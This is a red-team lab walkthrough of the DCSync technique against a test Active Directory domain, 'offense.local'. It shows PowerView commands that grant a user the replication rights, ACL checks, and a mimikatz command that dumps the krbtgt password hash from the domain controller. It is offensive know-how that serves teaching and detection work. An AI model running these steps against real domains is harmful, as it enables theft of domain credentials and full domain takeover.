# DCSync: Dump Password Hashes from Domain Controller

This lab shows how a misconfigured AD domain object permissions can be abused to dump DC password hashes using the DCSync technique with mimikatz.

It is known that the below permissions can be abused to sync credentials from a Domain Controller:

> * The “[**DS-Replication-Get-Changes**](https://msdn.microsoft.com/en-us/library/ms684354\(v=vs.85\).aspx)” extended right
>   * **CN:** DS-Replication-Get-Changes
>   * **GUID:** 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
> * The “[**Replicating Directory Changes All**](https://msdn.microsoft.com/en-us/library/ms684355\(v=vs.85\).aspx)” extended right
>   * **CN:** DS-Replication-Get-Changes-All
>   * **GUID:** 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
> * The “[**Replicating Directory Changes In Filtered Set**](https://msdn.microsoft.com/en-us/library/hh338663\(v=vs.85\).aspx)” extended right (this one isn’t always needed but we can add it just in case :)
>   * **CN:** DS-Replication-Get-Changes-In-Filtered-Set
>   * **GUID:** 89e95b76-444d-4c62-991a-0facbeda640c

### Execution

Inspecting domain's `offense.local` permissions, it can be observed that user `spotless` does not have any special rights just yet:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYHcIL_R4k6YNEXjoex%2F-LYHcll2Cw7RXzll00Y7%2FScreenshot%20from%202019-02-09%2014-18-32.png?alt=media\&token=db120148-d85d-4401-b8c8-8808844af82e)

Using PowerView, we can grant user `spotless` 3 rights that would allow them to grab password hashes from the DC:

{% code title="attacker\@victim" %}
```csharp
Add-ObjectACL -PrincipalIdentity spotless -Rights DCSync
```
{% endcode %}

Below shows the above command and also proves that spotless does not belong to any privileged group:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYHcIL_R4k6YNEXjoex%2F-LYHcnmhsrPaq84QCCXJ%2FScreenshot%20from%202019-02-09%2014-21-02.png?alt=media\&token=fd127c93-66ab-4d13-b4cc-f61645fbb55e)

However, inspecting `offense.local` domain object's privileges now, we can see 3 new rights related to `Directory Replication` added:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYHcIL_R4k6YNEXjoex%2F-LYHcqSVg0P0r8dBLjpC%2FScreenshot%20from%202019-02-09%2014-21-09.png?alt=media\&token=0cb494ef-c05f-4b98-9450-9c40d3834c04)

Let's grab the SID of the user spotless with `whoami /all`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYHcIL_R4k6YNEXjoex%2F-LYHeE3F5dXK_ePCdQJH%2FScreenshot%20from%202019-02-09%2014-28-18.png?alt=media\&token=682c2b70-15cf-4243-897d-07a50dcb60ce)

Using powerview, let's check that the user `spotless` `S-1-5-21-2552734371-813931464-1050690807-1106` has the same privileges as seen above using the GUI:

{% code title="attacker\@kali" %}
```csharp
Get-ObjectAcl -Identity "dc=offense,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-2552734371-813931464-1050690807-1106"}
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYHcIL_R4k6YNEXjoex%2F-LYHeGTSUXeuBes1DUA8%2FScreenshot%20from%202019-02-09%2014-27-54.png?alt=media\&token=69793e54-eccd-4592-9c37-dd3953c91345)

Additionally, we can achieve the same result without PowerView if we have access to AD Powershell module:

{% code title="attacker\@victim" %}
```csharp
Import-Module ActiveDirectory
(Get-Acl "ad:\dc=offense,dc=local").Access | ? {$_.IdentityReference -match 'spotless' -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYHn7bhLyxbOjA7EU9M%2F-LYHo8SqVwHexwGHFRIn%2FScreenshot%20from%202019-02-09%2015-11-36.png?alt=media\&token=82b495d7-34fe-41c1-a296-8f802dbb660f)

See [Active Directory Enumeration with AD Module without RSAT or Admin Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-ad-module-without-rsat-or-admin-privileges) to learn how to get AD module without admin privileges.

#### DCSyncing Hashes

Since the user `spotless` has now the required privileges to use `DCSync`, we can use mimikatz to dump password hashes from the DC via:

{% code title="attacker\@victim" %}
```csharp
lsadump::dcsync /user:krbtgt
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYHcIL_R4k6YNEXjoex%2F-LYHfiPA13UOQiYsWHVT%2FScreenshot%20from%202019-02-09%2014-34-44.png?alt=media\&token=1b755cd8-e2d9-45e4-9b25-72f58955065c)

### References

{% embed url="https://medium.com/@jsecurity101/syncing-into-the-shadows-bbd656dd14c8" %}
